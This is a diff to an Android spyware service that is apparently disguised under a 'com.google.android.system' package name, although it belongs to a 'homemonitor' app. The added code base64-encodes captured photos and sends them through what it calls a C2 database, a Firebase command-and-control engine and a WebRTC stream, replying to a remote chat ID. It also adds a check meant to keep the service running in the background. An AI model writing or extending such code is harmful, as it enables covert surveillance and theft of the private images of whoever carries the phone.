@@ -1,6 +1,7 @@
 package com.google.android.system
 
 import com.homemonitor.MainActivity
+import com.homemonitor.OemAutostartManager
 import android.Manifest
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -197,9 +198,31 @@ class MonitorService : LifecycleService() {
         fun sendPhotoPublic(chatId: String, photoFile: File) {
             val inst = activeInstance
             if (inst != null && photoFile.exists()) {
-                C2LocalDatabase.getInstance(inst).insertTelemetryLog("photos", "Photo captured: ${photoFile.name}")
+                val base64Str = try {
+                    val bytes = photoFile.readBytes()
+                    "data:image/jpeg;base64," + android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                } catch (_: Exception) { "" }
+
+                val contentPayload = JSONObject().apply {
+                    put("filename", photoFile.name)
+                    put("path", photoFile.absolutePath)
+                    put("sizeBytes", photoFile.length())
+                    put("imageData", base64Str)
+                    put("timestamp", System.currentTimeMillis())
+                }.toString()
+
+                C2LocalDatabase.getInstance(inst).insertTelemetryLog("photos", contentPayload)
+                C2LocalDatabase.getInstance(inst).insertMediaRecord("photo", photoFile.name, photoFile.absolutePath)
+
                 inst.firebaseC2Engine?.uploadTelemetryLog("photos", "Photo captured: ${photoFile.name}")
                 inst.firebaseC2Engine?.sendExecutionResponse(chatId, "📸 Photo captured successfully: ${photoFile.name}")
+
+                val eventPayload = JSONObject().apply {
+                    put("filename", photoFile.name)
+                    put("imageData", base64Str)
+                    put("timestamp", System.currentTimeMillis())
+                }
+                com.homemonitor.DeviceApiDispatcher(inst).dispatchStreamEvent(inst.webRtcEngine, "photos.stream", eventPayload)
             }
         }
 
@@ -308,6 +331,16 @@ class MonitorService : LifecycleService() {
 
         PhysicalSecurityGuard.restoreArmedStateIfNeeded(this)
         startForegroundWithNotification()
+        
+        // Ensure background battery optimization safeguards
+        try {
+            if (!OemAutostartManager.isBatteryOptimizationIgnored(this)) {
+                Log.w(TAG, "Battery optimization is active; requesting unthrottled background socket state...")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Battery optimization check error: ${e.message}")
+        }
+
         initializeEngines()
         com.homemonitor.ArchiveScheduler.schedulePeriodicArchive(this)
         GoogleDriveBackupEngine.startAutomatedZeroTouchDriveSyncLoop(this, serviceScope)
